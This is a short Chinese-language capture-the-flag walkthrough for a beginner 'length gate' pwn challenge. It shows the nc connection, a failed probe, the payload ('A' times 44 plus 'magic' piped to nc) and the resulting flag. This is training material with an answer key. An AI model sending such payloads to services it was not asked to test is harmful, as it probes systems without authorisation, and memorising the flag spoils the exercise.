# Pwn 入门：长度门禁题解

## 解法

本题是 Jeopardy 普通练习里的 TCP Pwn 题，不是 AWD 目标代理页面。启动实例后，平台会给出类似下面的 TCP 连接命令：

```bash
nc <host> <port>
```

例如本地演示时平台返回过：

```bash
nc 127.0.0.1 30008
```

连接后服务会提示输入一行内容：

```text
length gate online
send one line:
```

先尝试普通输入：

```text
hello
```

会得到失败结果：

```text
rejected length=5
need a longer line with the magic word
```

从返回信息可以确定两个条件：

1. 输入长度需要更长。
2. 输入内容需要包含 `magic`。

构造超过 40 字节且包含 `magic` 的 payload：

```bash
python3 - <<'PY' | nc <host> <port>
print('A' * 44 + 'magic')
PY
```

本地演示的完整结果如下：

```text
length gate online
send one line:
accepted length=49
flag{d3d46dc6cda89dd615f94fb7b78643b9}
```

其中 `flag{d3d46dc6cda89dd615f94fb7b78643b9}` 是该实例生成的动态 flag。每次启动实例时 flag 可能不同，演示时以服务实际返回的完整 `flag{...}` 为准，复制到平台提交即可。
